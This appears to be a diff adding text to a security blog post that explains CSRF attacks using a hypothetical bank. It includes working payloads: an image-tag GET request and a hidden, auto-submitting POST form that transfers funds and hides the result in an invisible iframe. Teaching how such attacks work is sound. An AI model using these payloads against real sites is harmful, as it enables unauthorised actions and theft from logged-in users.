@@ -9,6 +9,8 @@ background: '/img/posts/CSRF.jpg'
 
 Cross-Site Request Forgery (CSRF) stands as a pervasive and evolving threat in the realm of web security. As cyber threats continue to evolve, understanding CSRF attacks becomes paramount for developers, security professionals, and web administrators. This topic delves into the intricacies of CSRF attacks, exploring their mechanisms, detection methods, and preventive measures. From real-world examples to cutting-edge defense strategies, the discussion aims to empower the audience with insights to fortify web applications against CSRF vulnerabilities.
 
+## Exploiting Security: CSRF POST Request Attack
+
 
 ![IMDb page](/img/posts/Src.jpg)
 
@@ -44,10 +46,12 @@ Now, envision the user concluding their banking activities, closing the browser 
 
 If an attacker manages to manipulate the user into making a request to the bank's website, the request carries the cookie with authorization, and the server considers it authenticated. From the bank's perspective, this appears as just another routine request from the user's browser.
 
-````java
+```java
 <img src="https://bank.com/transfer?amount=10000&to_account=2468013579" />
 ```
 
+
+Should a user load a page featuring the provided image tag, it initiates a ``GET`` request to the URL indicated in the ``src`` attribute. In this situation, an unauthenticated user would be directed to bank.com's login page. However, for a user who was authenticated previously, access might be granted if the request is acknowledged by ``bank.com``.
 
 
 CSRF attacks can manifest in various actions, with some prevalent examples being:
@@ -58,5 +62,67 @@ CSRF attacks can manifest in various actions, with some prevalent examples being
 - Initiating fund transfers
 - Downloading malware
 
-
 ## Exploiting Security: CSRF POST Request Attack
+
+``GET`` requests aren't the sole method for initiating a CSRF attack. An alternative approach involves an attacker fabricating a form. Breaking down the process step by step can provide clarity on the construction of such an attack.
+
+Consider a scenario where an attacker conducts research to understand the appearance of a genuine bank.
+
+```java
+<html>
+  <head>
+    <title>Bank Website</title>
+  </head>
+  <body>
+    <form action="http://bank.com/transfer" method="POST" name="bank_form">
+      <input type="text" name="amount" value="" />
+      <input type="text" name="to_account" value="" />
+      <input type="submit" value="submit" />
+    </form>
+  </body>
+</html>>
+```
+The attacker can embed that HTML into a different page and deceive a user into submitting the form. This method can bypass any "allow POST requests only" safeguards that may be implemented, as it involves a ``POST`` request. Similar to a ``GET`` request, this ``POST`` request transmits any authorization cookies.
+
+To accomplish this, the attacker simply needs to discover a means of tricking a user into submitting the concealed form. This can be achieved by employing CSS to hide the form and then utilizing JavaScript to automatically submit the form upon page loading.
+    
+```java
+<html>
+  <head>
+    <title>Fake Form</title>
+  </head>
+  <body onload="document.bank_form.submit()">
+    <form action="http://bank.com/transfer" method="POST" name="bank_form" style="display: none;">
+      <input type="text" name="amount" value="10000" />
+      <input type="text" name="to_account" value="2468013579" />
+    </form>
+  </body>
+</html>
+```
+
+Take note that the body incorporates an ``onload`` attribute, prompting an immediate form submission, while the form employs a ``style`` attribute to keep itself hidden.
+
+This process doesn't necessitate the user to click "Submit"; in fact, there isn't even a submit button on the form. Persuading a user to visit this page is adequate to trigger the request, and accomplishing this can be as simple as embedding a deceptive link in a phishing email.
+
+However, there is a potential issue with this attack. After the form submission, the user might witness the outcomes, like a page on the bank's website confirming a "Funds transfer complete." If a user observes this, they may grow suspicious and likely contact their bank to annul the transaction.
+
+To counter this, an attacker must conceal the results. Forms facilitate the transmission of their outcomes to an ``iframe`` by utilizing a ``target`` attribute.
+
+```java
+<html>
+  <head>
+    <title>Fake Form</title>
+  </head>
+  <body onload="document.bank_form.submit()">
+    <form action="http://bank.com/transfer" method="POST" name="bank_form" style="display: none;" target="hidden_results" >
+      <input type="text" name="amount" value="10000" />
+      <input type="text" name="to_account" value="2468013579" />
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
+</html>
+```
+
+Observe the inclusion of the ``iframe`` tag, set to "``display: none``," and the addition of a new ``target`` attribute to the ``form`` tag.
+
+By concealing an ``iframe`` and directing the form results to it, the user will remain unaware that a CSRF attack has transpired.
